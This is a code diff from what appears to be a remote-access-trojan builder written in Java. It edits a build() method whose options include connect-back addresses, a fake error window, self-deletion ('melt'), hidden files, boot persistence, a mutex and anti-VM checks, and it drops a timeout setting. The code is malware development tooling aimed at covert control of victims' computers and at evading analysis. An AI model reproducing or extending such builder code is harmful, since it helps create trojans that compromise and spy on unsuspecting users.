@@ -36,7 +36,7 @@ public class Build {
 	}
 
 	@SuppressWarnings("resource")
-	public static void build(BuildListener listener, File buildFrom, File file, String[] addresses, String id, String pass, boolean dontInstall, int droppath, int reconSec, String name, boolean fakewindow, String faketitle, String fakemessage, int fakeicon, boolean melt, boolean runNextBoot, boolean hiddenFile, boolean mutex, int mutexport, boolean timeout, int timeoutms, boolean delay, int delayms, boolean trayicon, String icon, String traymsg, String traymsgfail, String traytitle, boolean persistance, int persistancems, boolean summary, boolean antivm) {
+	public static void build(BuildListener listener, File buildFrom, File file, String[] addresses, String id, String pass, boolean dontInstall, int droppath, int reconSec, String name, boolean fakewindow, String faketitle, String fakemessage, int fakeicon, boolean melt, boolean runNextBoot, boolean hiddenFile, boolean mutex, int mutexport, boolean delay, int delayms, boolean trayicon, String icon, String traymsg, String traymsgfail, String traytitle, boolean persistance, int persistancems, boolean summary, boolean antivm) {
 		listener.start();
 		
 		if (!file.getName().toLowerCase().endsWith(".jar")) {
@@ -119,8 +119,6 @@ public class Build {
 				config.put("name", name);
 				config.put("mutex", mutex);
 				config.put("mport", mutexport);
-				config.put("timeout", timeout);
-				config.put("toms", timeoutms);
 				config.put("per", persistance);
 				config.put("perms", persistancems);
 				config.put("vm", antivm);
